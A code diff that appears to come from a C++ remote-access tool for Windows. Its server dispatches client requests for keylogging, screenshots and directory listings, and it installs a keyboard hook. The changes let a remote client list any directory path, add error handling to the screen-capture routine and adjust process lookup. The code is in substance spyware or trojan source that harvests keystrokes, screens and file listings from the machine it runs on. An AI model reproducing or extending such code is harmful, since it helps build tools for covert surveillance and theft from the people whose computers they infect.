@@ -223,7 +223,7 @@ void Server::start(){
                     else if(requestFromClient.type() == KEYLOG_REQUEST)
                         responseToClient = this->keyLog();
                     else if (requestFromClient.type() == DIR_TREE_REQUEST)
-                        responseToClient = this->dirTree();
+                        responseToClient = this->dirTree((char*)requestFromClient.data());
                     else if (requestFromClient.type() == DISCONNECT_REQUEST)
                         responseToClient = this->disconnect();
                     else 
@@ -352,6 +352,10 @@ Response Server::screenShot(){
         screenWidth = dm.dmPelsWidth;
         screenHeight = dm.dmPelsHeight;
     }
+    else{
+        cerr << "Error: Can't get screen resolution.\n";
+        return Response(SCREENSHOT_RESPONSE, FAIL_CODE, 0, NULL);
+    }
 
     HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, screenWidth, screenHeight);
 
@@ -418,11 +422,11 @@ Response Server::keyLog(){
     return Response(KEYLOG_RESPONSE, OK_CODE, 0, NULL); 
 }
     
-Response Server::dirTree(){
-    cout << "Server: Received directory tree instruction.\n";
-    string result = printDirectoryTree("C:\\", 0);
+Response Server::dirTree(const char* pathName){
+    cout << "Server: Received listing directory tree instruction.\n";
+    string result = listDirectoryTree(pathName, 0);
 
-    cout << "Server: Directoried tree.\n";
+    cout << "Server: Listed directoried tree.\n";
     return Response(DIR_TREE_RESPONSE, OK_CODE, result.size() + 1, (void*)result.c_str());
 }
 
@@ -447,7 +451,7 @@ DWORD GetProcessIdByName(const char* processName) {
 
         if (Process32First(hSnapshot, &processEntry)) {
             do {
-                string currentProcessName(processEntry.szExeFile);
+                string currentProcessName((char*)processEntry.szExeFile);
                 if (currentProcessName == processName1) {
                     processId = processEntry.th32ProcessID;
                     break;
@@ -461,7 +465,7 @@ DWORD GetProcessIdByName(const char* processName) {
     return processId;
 }
 
-string printDirectoryTree(const char* path, int indent){
+string listDirectoryTree(const char* path, int indent){
     stringstream stream;
     WIN32_FIND_DATAA fd;
     HANDLE hFind = FindFirstFileA((string(path) + "\\*").c_str(), &fd);
@@ -474,7 +478,7 @@ string printDirectoryTree(const char* path, int indent){
 
                 if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY){
                     stream << "[+] " << fd.cFileName << '\n';
-                    stream << printDirectoryTree((string(path) + "\\" + fd.cFileName).c_str(), indent + 1);
+                    stream << listDirectoryTree((string(path) + "\\" + fd.cFileName).c_str(), indent + 1);
                 }
                 else{
                     stream << "    " << fd.cFileName << '\n';
@@ -536,5 +540,3 @@ LRESULT CALLBACK KeyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam){
     // Call next hook
     return CallNextHookEx(NULL, nCode, wParam, lParam);
 }
-
-
